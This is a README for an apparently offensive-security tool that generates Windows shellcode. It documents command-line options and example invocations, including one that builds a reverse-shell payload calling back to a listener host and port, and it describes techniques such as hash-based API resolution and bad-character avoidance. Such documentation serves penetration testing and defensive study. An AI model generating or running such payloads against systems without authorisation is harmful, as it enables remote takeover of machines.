# Windows Shellcode Generator

A toolkit for creating custom shellcode payloads for Windows targets. This project provides a comprehensive set of tools for shellcode generation, manipulation, and execution.

## Overview

This toolkit allows you to create custom shellcode for various purposes, including:
- Command execution
- Reverse shell connections
- API function resolution
- Process creation and manipulation

The generated shellcode is designed to be compact and flexible.

## Features

- **API Function Resolution**: Dynamically locate and call Windows API functions
- **Network Operations**: Create socket connections for reverse shells
- **Process Creation**: Execute commands and create processes on target systems
- **Command Execution**: Various methods to run commands (CreateProcess, WinExec)
- **Utility Functions**: Format and manipulate shellcode
- **Bad Character Handling**: Avoid problematic bytes in shellcode
- **Debugging Support**: Break points and verbose output for troubleshooting

## Requirements

- Python 3.12 or higher
- Keystone Engine (for assembly)

## Installation

1. Clone the repository
2. Install the required dependencies:
```shell script
pip install -r requirements.txt
```


## Usage

The main script provides a command-line interface with several options:

```shell script
python shellcode_blocks.py [options]
```


### Basic Options

- `-c, --command`: Specify command(s) to execute (can be used multiple times)
- `-l, --lhost`: Local host IP address for reverse shells
- `-p, --lport`: Local port number for reverse shells
- `-v, --verbose`: Enable debug printing
- `-e, --execute`: Execute shellcode after building
- `-a, --assembly`: Print full assembly code

### Advanced Options

- `-var, --variable`: Variable name to use in output
- `-lang, --language`: Output language (python, c++)
- `-f, --force_break`: Add debug breakpoints at the start
- `-ff, --force_break_functions`: Add debug breakpoints in key functions
- `-b, --bad_char`: Specify bad characters to avoid
- `-py, --python_script`: Generate a Python script for the shellcode
- `-ex, --exec`: Choose execution function (CREATE_PROCESS, WIN_EXEC)

### Examples

#### Generate command execution shellcode:
```shell script
python shellcode_blocks.py -c "cmd.exe /c whoami" -v
```


#### Create reverse shell payload:
```shell script
python shellcode_blocks.py -l 192.168.1.100 -p 4444
```


#### Generate shellcode and execute it:
```shell script
python shellcode_blocks.py -c "calc.exe" -e
```


#### Output assembly with debugging breakpoints:
```shell script
python shellcode_blocks.py -c "notepad.exe" -a -f
```


#### Generate a Python script with the shellcode:
```shell script
python shellcode_blocks.py -c "cmd.exe /c ping 127.0.0.1" -py shellcode.py
```


## Project Structure

- `shellcode_blocks.py`: Main script for generating shellcode
- `utils.py`: Utility functions and building blocks
- `api_function_hash_calculator.py`: Tool for calculating API function hashes

## Technical Details

### Shellcode Building Blocks

The toolkit includes functions for:

1. **Memory Operations**
   - Stack manipulation
   - String creation and handling

2. **API Resolution**
   - Finding base address of kernel32.dll
   - Locating API functions by hash
   - Loading additional DLLs (ws2_32.dll)

3. **Networking**
   - Creating sockets
   - Establishing connections
   - Setting up data structures

4. **Process Creation**
   - STARTUPINFO structure setup
   - CreateProcess and WinExec calls
   - Command parameter handling

### Function Hashing

The toolkit uses a custom hashing algorithm to find Windows API functions:
- Calculates hashes based on function names
- Performs right-rotate operations on sums of ASCII values
- Allows shellcode to locate functions without hardcoded addresses

## Security Considerations

This toolkit is designed for educational and professional security testing purposes only. The generated shellcode can be used to:

- Test security controls
- Develop defense mechanisms
- Understand low-level system operations

**Important**: Use responsibly and only on systems you own or have explicit permission to test.

## Author

wh1rl3y

## License

This project is licensed under the GNU General Public License v3.0 - see the [LICENSE](LICENSE) file for details.

Copyright (C) 2025 Your Name

This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.

This program comes with ABSOLUTELY NO WARRANTY. See the GNU General Public License for more details.
